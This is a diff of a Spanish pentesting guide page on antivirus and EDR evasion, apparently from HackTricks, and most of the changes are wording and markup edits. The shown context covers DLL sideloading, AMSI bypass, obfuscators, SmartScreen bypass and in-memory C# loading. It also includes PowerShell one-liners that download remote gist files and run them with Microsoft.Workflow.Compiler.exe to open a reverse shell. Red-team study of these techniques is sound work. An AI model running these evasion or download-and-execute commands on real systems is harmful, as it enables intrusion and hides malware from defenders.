@@ -45,9 +45,9 @@ Algunos otros consejos realmente buenos de [@mgeeky](https://twitter.com/mariusz
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>
 
-Como hemos dicho antes en este post, **las herramientas públicas** eventualmente **serán detectadas**, así que deberías preguntarte algo:
+Como hemos dicho antes en esta publicación, **las herramientas públicas** eventualmente **serán detectadas**, así que deberías preguntarte algo:
 
-Por ejemplo, si deseas volcar LSASS, **¿realmente necesitas usar mimikatz**? O podrías usar un proyecto diferente que sea menos conocido y que también voltee LSASS.
+Por ejemplo, si deseas volcar LSASS, **¿realmente necesitas usar mimikatz**? ¿O podrías usar un proyecto diferente que sea menos conocido y que también voltee LSASS?
 
 La respuesta correcta probablemente sea la última. Tomando a mimikatz como ejemplo, probablemente sea una de, si no la más, marcada pieza de malware por los AV y EDR, mientras que el proyecto en sí es súper genial, también es una pesadilla trabajar con él para eludir los AV, así que solo busca alternativas para lo que estás tratando de lograr.
 
@@ -77,7 +77,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.
 
-Recomiendo encarecidamente que **explores programas DLL Hijackable/Sideloadable tú mismo**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas Sideloadable de DLL conocidos públicamente, podrías ser atrapado fácilmente.
+Recomiendo encarecidamente que **explores los programas DLL Hijackable/Sideloadable tú mismo**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas DLL Sideloadable de conocimiento público, podrías ser atrapado fácilmente.
 
 Simplemente colocar una DLL maliciosa con el nombre que un programa espera cargar, no cargará tu payload, ya que el programa espera algunas funciones específicas dentro de esa DLL. Para solucionar este problema, utilizaremos otra técnica llamada **DLL Proxying/Forwarding**.
 
@@ -100,7 +100,7 @@ El último comando nos dará 2 archivos: una plantilla de código fuente DLL y l
 ```
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la DLL proxy tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo llamaría eso un éxito.
+¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la DLL proxy tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo llamaría a eso un éxito.
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
@@ -125,7 +125,7 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 ## AMSI (Interfaz de Escaneo Anti-Malware)
 
-AMSI fue creado para prevenir "[malware sin archivos](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AV solo podían escanear **archivos en disco**, así que si de alguna manera podías ejecutar cargas útiles **directamente en memoria**, el AV no podía hacer nada para prevenirlo, ya que no tenía suficiente visibilidad.
+AMSI fue creado para prevenir "[malware sin archivos](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los antivirus solo podían escanear **archivos en disco**, por lo que si de alguna manera podías ejecutar cargas útiles **directamente en memoria**, el antivirus no podía hacer nada para prevenirlo, ya que no tenía suficiente visibilidad.
 
 La función AMSI está integrada en estos componentes de Windows.
 
@@ -188,7 +188,7 @@ Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com
 > [!NOTE]
 > Por favor, lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.
 
-También hay muchas otras técnicas utilizadas para eludir AMSI con PowerShell, consulta [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [este repositorio](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.
+También hay muchas otras técnicas utilizadas para eludir AMSI con PowerShell, consulta [**esta página**](basic-powershell-for-pentesters/#amsi-bypass) y [este repositorio](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.
 
 O este script que a través de patching de memoria parcheará cada nuevo Powersh
 
@@ -199,10 +199,10 @@ Hay varias herramientas que se pueden usar para **ofuscar código en texto claro
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Ofuscador de C#**
 - [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de proporcionar mayor seguridad en el software a través de [ofuscación de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y protección contra manipulaciones.
 - [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar ninguna herramienta externa y sin modificar el compilador.
-- [**obfy**](https://github.com/fritzone/obfy): Agrega una capa de operaciones ofuscadas generadas por el marco de metaprogramación de plantillas de C++ que hará que la vida de la persona que quiera crackear la aplicación sea un poco más difícil.
+- [**obfy**](https://github.com/fritzone/obfy): Agrega una capa de operaciones ofuscadas generadas por el marco de metaprogramación de plantillas de C++ que dificultará un poco la vida a la persona que quiera crackear la aplicación.
 - [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador de binarios x64 que puede ofuscar varios archivos pe diferentes, incluyendo: .exe, .dll, .sys
 - [**metame**](https://github.com/a0rtega/metame): Metame es un motor de código metamórfico simple para ejecutables arbitrarios.
-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un marco de ofuscación de código de grano fino para lenguajes compatibles con LLVM utilizando ROP (programación orientada a retorno). ROPfuscator ofusca un programa a nivel de código ensamblador transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un marco de ofuscación de código de grano fino para lenguajes compatibles con LLVM utilizando ROP (programación orientada a retorno). ROPfuscator ofusca un programa a nivel de código de ensamblaje transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
 - [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un Crypter PE de .NET escrito en Nim.
 - [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos.
 
@@ -214,7 +214,7 @@ Microsoft Defender SmartScreen es un mecanismo de seguridad destinado a proteger
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen funciona principalmente con un enfoque basado en la reputación, lo que significa que las aplicaciones que se descargan poco comúnmente activarán SmartScreen, alertando y evitando que el usuario final ejecute el archivo (aunque el archivo aún se puede ejecutar haciendo clic en Más información -> Ejecutar de todos modos).
+SmartScreen funciona principalmente con un enfoque basado en la reputación, lo que significa que las aplicaciones descargadas poco comúnmente activarán SmartScreen, alertando y evitando que el usuario final ejecute el archivo (aunque el archivo aún se puede ejecutar haciendo clic en Más información -> Ejecutar de todos modos).
 
 **MoTW** (Marca de la Web) es un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con el nombre de Zone.Identifier que se crea automáticamente al descargar archivos de internet, junto con la URL de la que se descargó.
 
@@ -259,13 +259,13 @@ Aquí hay una demostración para eludir SmartScreen empaquetando cargas útiles 
 
 Cargar binarios de C# en memoria se conoce desde hace bastante tiempo y sigue siendo una excelente manera de ejecutar tus herramientas de post-explotación sin ser detectado por AV.
 
-Dado que la carga útil se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.
+Dado que la carga útil se cargará directamente en la memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.
 
 La mayoría de los frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya ofrecen la capacidad de ejecutar ensamblados de C# directamente en memoria, pero hay diferentes formas de hacerlo:
 
 - **Fork\&Run**
 
-Esto implica **generar un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y, cuando haya terminado, matar el nuevo proceso. Esto tiene tanto sus beneficios como sus desventajas. El beneficio del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso de implante Beacon. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implante sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Detecciones Comportamentales**.
+Esto implica **generar un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y, cuando termines, matar el nuevo proceso. Esto tiene tanto sus beneficios como sus desventajas. El beneficio del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso de implante Beacon. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implante sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Detecciones Comportamentales**.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
@@ -294,23 +294,19 @@ La evasión es un tema muy complicado, a veces tienes que tener en cuenta muchas
 
 Cada entorno al que te enfrentes tendrá sus propias fortalezas y debilidades.
 
-Te animo a que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94) para obtener una base sobre técnicas de evasión más avanzadas.
+Te animo a que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una base sobre técnicas de evasión más avanzadas.
 
-{{#ref}}
-https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
-{{#endref}}
+{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
 
-Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasión en Profundidad.
+Esta también es otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasión en Profundidad.
 
-{{#ref}}
-https://www.youtube.com/watch?v=IbA7Ung39o4
-{{#endref}}
+{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
 
 ## **Técnicas Antiguas**
 
 ### **Ver qué partes encuentra Defender como maliciosas**
 
-Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **descubra qué parte Defender** encuentra como maliciosa y te lo dividirá.\
+Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **descubra qué parte Defender** está encontrando como maliciosa y te lo dividirá.\
 Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred) con un servicio web abierto que ofrece el servicio en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Servidor Telnet**
@@ -467,7 +463,11 @@ catch (Exception err) { }
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
-Descarga y ejecución automática:
+[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
+
+[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
+
+Descarga y ejecución automáticas:
 ```csharp
 64bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
@@ -475,9 +475,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 32bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
 ```
-{{#ref}}
-https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
-{{#endref}}
+{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
 
 Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
@@ -526,5 +524,6 @@ https://github.com/praetorian-code/vulcan
 ### Más
 
 - [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
+
 
 {{#include ../banners/hacktricks-training.md}}
